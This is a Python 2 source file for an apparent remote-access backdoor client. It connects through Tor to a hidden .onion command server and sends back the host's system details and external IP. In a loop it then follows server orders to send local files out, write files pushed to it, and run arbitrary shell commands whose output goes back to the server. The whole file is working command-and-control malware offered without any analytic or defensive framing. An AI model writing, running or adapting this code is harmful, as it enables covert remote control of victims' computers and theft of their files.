import socket, ssl, pprint, socks, os, sys, hashlib, hmac, platform, urllib2
from colored import fg, bg, attr
from subprocess import Popen, PIPE, STDOUT

host = '3pnzzdpq7aj6s6b6.onion'
cType = "client000-crypto"

# sysinfo
uname = platform.uname()[0:3]

try:
    myIP = urllib2.urlopen("http://myexternalip.com/raw").read()[0:-1]
except:
    myIP = "Error! Can't check IP!"
def RecvData():
    temp = ssl_sock.read()
    return temp

def RecvData():
    temp = ssl_sock.read()
    return temp

def CheckHash(fileName,fileHashHEX):
    with open(fileName, 'rb') as inFile:
        buf = inFile.read()
        hasher.update(buf)
    if hmac.compare_digest(hasher.hexdigest(),fileHashHEX) == True:
        pass
    else:
        print "Warning!"

def CalcHash(fileName):
    with open(fileName, 'rb') as inFile:
        buf = inFile.read()
        hasher.update(buf)
    return hasher.hexdigest()

def SendData(inText):
    ssl_sock.write(inText)

def EXEC(cmd):
    p = Popen(cmd, shell=True, stdin=PIPE, stdout=PIPE, stderr=STDOUT, close_fds=True)
    return p.stdout.read()

def UploadFILE(fileName):
    fileUP = open(fileName, 'rb')
    SendData(str(os.path.getsize(fileName)))
    while 1:
        tempData = fileUP.read()
        if tempData == '':
            break
        else:
            SendData(tempData)
    fileUP.close()
    SendData("CUF") #Client Upload Finished

def DownloadFILE(fileName):
    fileDOWN = open(fileName, 'wa')
    while 1:
        temp = RecvData()
        if temp == 'SUF':
            break
        else: 
            fileDOWN.write(temp)
    fileDOWN.close()
    SendData("CDF")


sock = socks.socksocket()
sock.setproxy(socks.PROXY_TYPE_SOCKS5,"127.0.0.1",9050)
sock.connect((host,5555))

ssl_sock = ssl.wrap_socket(sock,
                           ca_certs="priv_dom2.crt",
                           cert_reqs=ssl.CERT_REQUIRED)


print repr(ssl_sock.getpeername())
print ssl_sock.cipher()
print pprint.pformat(ssl_sock.getpeercert())
SendData(cType)

while 1:
    inText = RecvData()
    if inText.startswith("download"):
        UploadFILE(inText.split(" ")[1])
        chunk = RecvData()
    elif inText == "info":
        SendData(str(uname))
        SendData('ip:'+myIP)
        SendData("end-info")
    elif inText.startswith("upload"):
        DownloadFILE(inText.split(" ")[1])
    elif inText == "terminate":
        ssl_sock.close()
        sys.exit(0)
    elif inText.startswith("exec"):
        outEXEC = EXEC(inText.split(":")[1])
        SendData(outEXEC)
    else:
        print '[inText] ' + inText
        ssl_sock.write(inText)
